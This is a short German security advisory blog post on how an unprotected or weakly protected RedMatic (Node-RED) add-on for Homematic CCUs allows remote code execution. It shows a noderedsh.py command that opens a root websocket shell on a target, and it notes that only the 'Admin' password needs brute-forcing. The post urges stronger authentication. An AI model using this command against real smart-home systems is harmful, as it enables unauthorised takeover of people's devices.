---
layout: post
title:  "RedMatic als Homematic AddOn kann für Remote Code Execution missbraucht werden"
date:   2019-09-19 21:00:00 MEST
author: 'psytester'
---

RedMatic baut auf Node-RED auf und ist eine Erweiterung für Homematic CCUs.<br>
Wenn der Node-RED Zugang ungeschützt ist, weil die Authentifizierung abgeschaltet wurde, kann ein Angreifer dadurch sofort eine Remote Code Execution auf dem System durchführen, ganz einfach über Port 80.<br>
Wenn der Zugang mit den Login Mitteln der CCU gesichert ist, kennen wir zumindest den Usernamen "Admin" und nur das Passwort muss per Bruteforce gefunden werden.<br>
Ist der Zugang Individuell gesichert mit einer eigenen Username/Password Kombination, wird es schon schwieriger sein, die Zugangsdaten zu erhalten.<br>
<br>
Wie in dem Artikel [Gaining RCE by abusing Node-RED](https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/) aufgezeigt, ist dies für RedMatic Systeme auch ausnutzbar.<br>
Ein Websocket dient dabei als Shell Zugang. Echt verrückt, was alles möglich ist:<br>
```
./noderedsh.py --username Admin --password mySecret http://1.2.3.4/addons/red
.....
[+] Establishing RCE link ....
> ls -l
total 4840
-rw-r--r--    1 root   root 43 Sep  5 14:57 VERSION
........
```
Also bitte niemals die Authentifizierung abschalten oder einfache Passwörter nutzen.<br>


# Disclaimer

The information provided is released "as is" without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information.
In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.

The contents of this advisory are copyright (c) 2019 by psytester and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.
